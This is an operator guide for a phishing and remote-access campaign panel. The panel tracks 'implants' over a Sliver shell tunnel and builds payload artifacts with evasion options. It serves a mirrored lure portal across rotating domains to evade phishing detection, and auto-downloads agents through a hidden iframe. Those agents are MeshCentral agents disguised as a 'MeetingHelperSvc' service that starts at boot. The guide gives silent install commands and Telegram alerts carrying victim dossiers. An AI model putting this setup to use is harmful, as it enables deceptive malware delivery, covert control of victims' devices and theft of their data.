# Operator guide

## Sign in

`https://panel.<zone>` is behind Cloudflare Access (one-time PIN to the operator
email). Then the panel login (bcrypt password from deploy). If Access fights the
WebSocket upgrades (shell/desktop), disable the Access app for `panel.` in the
Cloudflare dashboard — the panel login is still enforced.

## Implants

- The table refreshes every 1s. Click a host to open the drawer.
- Desktop tab: click **connect desktop**; the browser relays JPEG frames and
  your mouse/keyboard to the target via the rd helper over WSS:8443.
- Shell tab: an interactive xterm over the Sliver shell tunnel.
- Files / processes / info tabs: browse, up/download, kill, and read system data.
- Tag and rename from the row/drawer; tags are stored panel-side.

## Build

Build page → set document name / transport / c2 / evasion / cadence → **build six
artifacts**. Each has a SHA256, a download link and a delivery block. Slugs let a
`get.<zone>/e/<slug>` hit be attributed to a build.

## Lure / rotation

Any of the alias hosts (`get`,`us01web`..`us05web`) serves the mirrored portal.
The injected script downloads from a **random** alias, so traffic spreads across
domains to dodge phishing detection. `PANEL_LURE_HOSTS` in `/etc/panel/env`
controls the pool; `deploy/cloudflare.sh` creates/maintains the DNS records and
tunnel ingress for all of them.

Re-mirror the site (e.g. after the portal updates):

```
PORTAL=https://us05web.telcom.stream bash lure/sync.sh   # refreshes panel/lure
```

## Alerts

Telegram receives: new-implant dossiers (host/user/os/arch/integrity, public IP +
country + ISP, local IPs, device data, and the reconnect core: session id, C2,
transport, interval, first/last contact), 10s telemetry, session death, panel
start/crash, failed-login bursts, and healthcheck/tunnel alarms.

## Health

`deploy.sh --check` verifies panel/bridge/gRPC/rd/tunnel/TLS/Cloudflare/disk. A
60s healthcheck timer Telegrams after 3 consecutive failures and restarts the
stack; a 6h heartbeat makes a silent death visible.
## MeshCentral (unattended remote access)

The panel ships a MeshCentral stand-alone server (`fleet-meshcentral.service`,
`/opt/meshcentral`) fronted by the `fleet-edge` Cloudflare tunnel at
`https://mesh.<zone>/` (ingress -> `127.0.0.1:9443`, TLS offloaded at the edge,
agent endpoint `wss://mesh.<zone>/`).

- `deploy/meshcentral-backup.sh` + timer back up `/opt/meshcentral/meshcentral-data`
  and `meshcentral-files` (7 day rolling tar, mode 600) to `/var/lib/fleet/meshcentral-backups`.
- Operator signs into the fleet panel at `https://panel.<zone>/` (Cloudflare Access
  + panel login). The panel `/mesh` section links the stand-alone console and shows
  install guidance per platform.
- MeshCentral keeps its own administrator account (invite-only domain,
  `newAccounts: 0`) with second factor; the agent connection itself is outbound and
  does not traverse Cloudflare Access, so agent endpoints must stay outside an
  Access policy.
- Devices: Windows (MeshAgent installer elevated), Linux (install script), macOS
  (binary installer + privacy permissions), Android (MeshCentral Android agent).
  Outbound-only connection means no inbound device firewall rule is required.

### Installers (per OS, as designed)

MeshCentral generates the installer for each operating system; the panel serves
the matching one on `/mesh` and through the lure:

- Windows: service executable with the mesh embedded; run elevated. Silent:
  `MeetingHelperSvc64-<group>.exe -fullinstall`.
- Linux/BSD: the official install script (`/__lure/meshagent?os=linux`). It
  detects the architecture, downloads the right agent and runs `-fullinstall`:
  `sudo -E ./meshinstall.sh` (the panel-served script is preconfigured;
  `sudo -E ./meshinstall.sh https://mesh.<zone> '<mesh-id>'` is the official
  equivalent).
- macOS: the official binary installer wrapped as a script
  (`/__lure/meshagent?os=macos`, `MeetingHelperSvc-macos.sh`). Run it; it
  downloads the universal agent, clears quarantine (`xattr`), and runs
  `-install` with sudo. Grant Screen Recording and Accessibility after
  installation for desktop control. No `.pkg`/`.app` is used.
- Android: APK (`/meshagents?id=14`) plus the invite link or QR code.

No zip archives are exposed and the lure never serves `.pkg`/`.app` files. Each
installer runs as the `MeetingHelperSvc` service
(LaunchDaemon/systemd/Windows service) and starts at boot.

### Agent branding

`domains."" .agentcustomization` in
`/opt/meshcentral/meshcentral-data/config.json` sets `displayname`,
`servicename` and `filename` to `MeetingHelperSvc`, `companyname` to
`MeetingHelper`, and `description` to `MeetingHelper background service`.
Branding is embedded in the agent msh at download time; installed agents keep
their previous identity until reinstalled.

### Lure auto-download

Lure pages request `/__lure/meshagent?os=<detected>` on load. Windows returns
the service executable; Linux/BSD returns the install script; macOS returns the
binary-installer script; Android returns the APK. The hidden-iframe download follows
the browser's normal download policy.

### Mobile enrollment (QR)

`/mesh` renders a QR (`/api/mesh/qr`) for the non-expiring device-group invite
(`PANEL_MESHCENTRAL_INVITE_URL`). Install the APK, then scan the QR or open the
invite to pair. Regenerate with
`meshctrl GenerateInviteLink --group "Fleet Devices" --hours 0`.
